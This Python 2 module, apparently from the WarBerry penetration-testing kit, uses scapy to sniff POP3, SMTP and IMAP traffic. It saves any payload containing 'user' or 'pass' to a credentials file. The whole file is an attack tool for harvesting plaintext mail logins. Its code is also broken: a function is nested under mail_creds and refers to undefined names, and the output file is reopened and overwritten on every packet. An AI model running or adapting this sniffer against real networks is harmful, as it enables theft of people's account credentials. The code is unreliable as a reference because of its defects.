from scapy.all import *
from src.utils.console_colors import *


def packet_callback(packet):
    if os.path.isfile('../Results/mailcreds'):
        print bcolors.WARNING + "[!] Mail Creds Results File Exists. Previous Results will be overwritten\n " + bcolors.ENDC
    with open('../Results/mailcreds', 'w') as mailcreds:
        if packet[TCP].payload:
            mail_packet = str(packet[TCP].payload)
            if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
                print "[*] Server: %s" % packet[IP].dst
                print "[*] %s" % packet[TCP].payload
                mailcreds.write(packet[IP].dst + " " + packet[TCP].payload)


def mail_creds(iface, expire):
    print " "
    print bcolors.OKGREEN + "      [ MAIL INFO SNIFFER MODULE ]\n" + bcolors.ENDC
    print '[*] Sniffing for %d seconds...' %expire
    #check which interface is being used    
def options(iface):    
    if options.iface == "wlan0":
        sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", iface="wlan0", prn=packet_callback, store=0, timeout=expire)
    elif options.iface == "eth0":
        sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", iface="eth0", prn=packet_callback, store=0, timeout=expire)    
    else:
        sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", iface=options.iface, prn=packet_callback, store=0, timeout=expire)    

        
print bcolors.OKGREEN + "[+] " + bcolors.ENDC + "Capture Completed." + bcolors.ENDC + " Results saved at " + bcolors.OKGREEN + "../WarBerry/Results/mailcreds!\n" + bcolors.ENDC
